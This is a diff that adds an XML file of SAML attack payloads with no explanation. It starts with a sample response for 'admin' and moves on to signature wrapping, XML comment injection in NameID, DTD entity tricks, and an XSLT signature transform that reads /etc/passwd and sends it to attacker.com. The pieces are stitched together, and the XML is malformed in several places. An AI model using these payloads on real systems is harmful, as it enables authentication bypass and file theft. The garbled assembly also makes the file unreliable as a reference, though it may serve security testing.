@@ -1,0 +1,74 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<saml2p:Response xmlns:saml2p="urn:oasis:names:tc:SAML:2.0:protocol" Destination="http://localhost:7001/saml2/sp/acs/post" ID="id39453084082248801717742013" IssueInstant="2018-04-22T10:28:53.593Z" Version="2.0">
+<saml2:Issuer xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion" Format="urn:oasis:names:tc:SAML:2.0:nameidformat:entity">REDACTED</saml2:Issuer>
+<saml2p:Status xmlns:saml2p="urn:oasis:names:tc:SAML:2.0:protocol">
+<saml2p:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success" />
+</saml2p:Status>
+<saml2:Assertion xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion" ID="id3945308408248426654986295" IssueInstant="2018-04-22T10:28:53.593Z" Version="2.0">
+<saml2:Issuer Format="urn:oasis:names:tc:SAML:2.0:nameid-format:entity" xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion">REDACTED</saml2:Issuer>
+<saml2:Subject xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion">
+<saml2:NameID Format="urn:oasis:names:tc:SAML:1.1:nameidformat:unspecified">admin</saml2:NameID>
+<saml2:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
+<saml2:SubjectConfirmationData NotOnOrAfter="2018-04-22T10:33:53.593Z" Recipient="http://localhost:7001/saml2/sp/acs/post" />
+</saml2:SubjectConfirmation>
+</saml2:Subject>
+<saml2:Conditions NotBefore="2018-04-22T10:23:53.593Z" NotOnOrAfter="2018-0422T10:33:53.593Z" xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion">
+<saml2:AudienceRestriction>
+<saml2:Audience>WLS_SP</saml2:Audience>
+</saml2:AudienceRestriction>
+</saml2:Conditions>
+<saml2:AuthnStatement AuthnInstant="2018-04-22T10:28:49.876Z" SessionIndex="id1524392933593.694282512" xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion">
+<saml2:AuthnContext>
+<saml2:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</saml2:AuthnContextClassRef>
+</saml2:AuthnContext>
+</saml2:AuthnStatement>
+</saml2:Assertion>
+</saml2p:Response>
+<SAMLResponse>
+<FA ID="evil">
+<Subject>Attacker</Subject>
+</FA>
+<LA ID="legitimate">
+<Subject>Legitimate User</Subject>
+<LAS>
+<Reference Reference URI="legitimate">
+</Reference>
+</LAS>
+</LA>
+</SAMLResponse>
+<Issuer>https://idp.com/</Issuer>
+<Assertion ID="_id1234">
+<Subject>
+<NameID>user@user.com<!--XMLCOMMENT-->.evil.com</NameID>
+<!DOCTYPE Response [
+<!ENTITY s "s">
+<!ENTITY f1 "f1">
+<saml2p:Response xmlns:saml2p="urn:oasis:names:tc:SAML:2.0:protocol"
+Destination="https://idptestbed/Shibboleth.sso/SAML2/POST"
+ID="_04cfe67e596b7449d05755049ba9ec28"
+InResponseTo="_dbbb85ce7ff81905a3a7b4484afb3a4b"
+IssueInstant="2017-12-08T15:15:56.062Z" Version="2.0">
+[...]
+<saml2:Attribute FriendlyName="uid"
+Name="urn:oid:0.9.2342.19200300.100.1.1"
+NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:uri">
+<saml2:AttributeValue>
+&s;taf&f1;
+</saml2:AttributeValue>
+</saml2:Attribute>
+<ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
+...
+<ds:Transforms>
+<ds:Transform>
+<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+<xsl:template match="doc">
+<xsl:variable name="file" select="unparsed-text('/etc/passwd')"/>
+<xsl:variable name="escaped" select="encode-for-uri($file)"/>
+<xsl:variable name="attackerUrl" select="'http://attacker.com/'"/>
+<xsl:variable name="exploitUrl"select="concat($attackerUrl,$escaped)"/>
+<xsl:value-of select="unparsed-text($exploitUrl)"/>
+</xsl:template>
+</xsl:stylesheet>
+</ds:Transform>
+</ds:Transforms>
+</ds:Signature>
